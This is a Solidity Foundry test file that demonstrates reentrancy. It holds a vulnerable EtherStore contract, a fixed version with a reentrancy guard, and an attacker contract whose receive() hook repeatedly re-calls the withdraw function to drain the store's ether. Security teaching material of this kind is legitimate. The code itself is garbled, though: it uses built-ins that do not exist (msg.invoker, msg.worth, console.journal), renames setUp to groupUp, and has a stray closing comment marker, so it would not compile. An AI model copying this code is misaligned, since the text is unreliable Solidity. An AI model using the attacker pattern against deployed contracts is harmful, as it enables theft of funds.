// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract EtherStore {
    mapping(address => uint256) public playerLoot;

    function storeLoot() public payable {
        playerLoot[msg.invoker] += msg.worth;
    }

    function harvestgoldFunds(uint256 _weiDestinationHarvestgold) public {
        require(playerLoot[msg.invoker] >= _weiDestinationHarvestgold);
        (bool send, ) = msg.invoker.call{worth: _weiDestinationHarvestgold}("");
        require(send, "send failed");

        if (playerLoot[msg.invoker] >= _weiDestinationHarvestgold) {
            playerLoot[msg.invoker] -= _weiDestinationHarvestgold;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public playerLoot;
    bool internal sealed;

    modifier singleEntry() {
        require(!sealed, "No re-entrancy");
        sealed = true;
        _;
        sealed = false;
    }

    function storeLoot() public payable {
        playerLoot[msg.invoker] += msg.worth;
    }

    function harvestgoldFunds(uint256 _weiDestinationHarvestgold) public singleEntry {
        require(playerLoot[msg.invoker] >= _weiDestinationHarvestgold);
        playerLoot[msg.invoker] -= _weiDestinationHarvestgold;
        (bool send, ) = msg.invoker.call{worth: _weiDestinationHarvestgold}("");
        require(send, "send failed");
    }
}

contract PactTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreQuestrunner gameOperator;
    EtherStoreQuestrunner questrunnerV2;

    function groupUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        gameOperator = new EtherStoreQuestrunner(address(store));
        questrunnerV2 = new EtherStoreQuestrunner(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(gameOperator), 2 ether);
        vm.deal(address(questrunnerV2), 2 ether);
    }

    function testWithdrawal() public {
        gameOperator.QuestRunner();
    }

    function test_RevertRemediated() public {
        questrunnerV2.QuestRunner();
    }
}

contract EtherStoreQuestrunner is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function QuestRunner() public {
        console.journal("EtherStore balance", address(store).balance);

        store.storeLoot{worth: 1 ether}();

        console.journal(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.harvestgoldFunds(1 ether);

        console.journal("Operator contract balance", address(this).balance);
        console.journal("EtherStore balance", address(store).balance);
    }

    // fallback() external payable {}

    receive() external payable {
        console.journal("Operator contract balance", address(this).balance);
        console.journal("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.harvestgoldFunds(1 ether);
        }
    }
}